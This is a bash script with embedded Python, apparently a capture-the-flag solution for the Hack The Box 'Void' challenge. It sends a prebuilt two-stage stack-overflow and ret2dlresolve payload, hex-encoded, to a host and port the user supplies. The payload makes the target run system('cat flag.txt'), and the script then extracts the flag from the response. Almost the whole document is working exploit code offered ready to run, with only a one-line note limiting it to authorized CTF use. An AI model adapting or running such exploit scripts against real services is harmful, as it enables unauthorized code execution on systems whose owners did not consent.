#!/usr/bin/env bash

set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Void
# Type: Stack overflow + ret2dlresolve -> system("cat flag.txt")
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=8
readonly DEFAULT_STAGE_DELAY=0.20

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
STAGE_DELAY="${DEFAULT_STAGE_DELAY}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<USAGE
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>              Target host/IP
  --port <port>              Target TCP port
  --timeout <seconds>        Socket timeout (default: ${DEFAULT_TIMEOUT})
  --stage-delay <seconds>    Delay between stage1 and stage2 (default: ${DEFAULT_STAGE_DELAY})
  --json                     Print result as JSON
  --verbose                  Enable debug output
  -h, --help                 Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/protocol failure
  4  Exploit sent but flag not found
USAGE
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --stage-delay)
        STAGE_DELAY="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -* )
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi

  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${HOST}:${PORT}"
  log_debug "Sending prebuilt two-stage ret2dlresolve payload"

  python3 - "$HOST" "$PORT" "$TIMEOUT" "$STAGE_DELAY" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
import json
import re
import socket
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])
stage_delay = float(sys.argv[4])
json_output = sys.argv[5] == "1"
verbose = sys.argv[6] == "1"


def emit_debug(msg: str) -> None:
    if verbose and not json_output:
        print(f"[D] {msg}", file=sys.stderr)


def fail(code: int, msg: str) -> None:
    if json_output:
        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
    else:
        print(f"[-] {msg}", file=sys.stderr)
    raise SystemExit(code)


# Stage 1: overflow + primary ROP for read() and resolver trampoline.
stage1 = bytes.fromhex(
    "6161616162616161636161616461616165616161666161616761616168616161"
    "696161616a6161616b6161616c6161616d6161616e6161616f6161617061616171"
    "61616172616161bb114000000000000000000000000000b911400000000000004e"
    "400000000000696161616a6161613010400000000000bb11400000000000584e40"
    "000000000020104000000000001603000000000000"
)

# Stage 2: forged ret2dlresolve blob for system("cat flag.txt").
stage2 = bytes.fromhex(
    "73797374656d006163616161646161616561616166616161704a000000000000000000000000000000000000000000006d6161616e6161616f61616170616161004e400000000000070000001f030000000000000000000063617420666c61672e74787400"
)

emit_debug(f"stage1_len={len(stage1)} stage2_len={len(stage2)}")

try:
    sock = socket.create_connection((host, port), timeout=timeout)
except Exception as exc:
    fail(3, f"Connection failed: {exc}")

try:
    sock.settimeout(timeout)
    sock.sendall(stage1)
    time.sleep(stage_delay)
    sock.sendall(stage2)

    chunks = []
    end = time.time() + timeout
    while time.time() < end:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
finally:
    sock.close()

text = b"".join(chunks).decode("latin1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", text)

if not match:
    if verbose and not json_output:
        print("[D] Response preview:", file=sys.stderr)
        print(text[:800], file=sys.stderr)
    fail(4, "Flag pattern not found in target response")

flag = match.group(0)

if json_output:
    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
else:
    print(flag)
PY
}

main "$@"
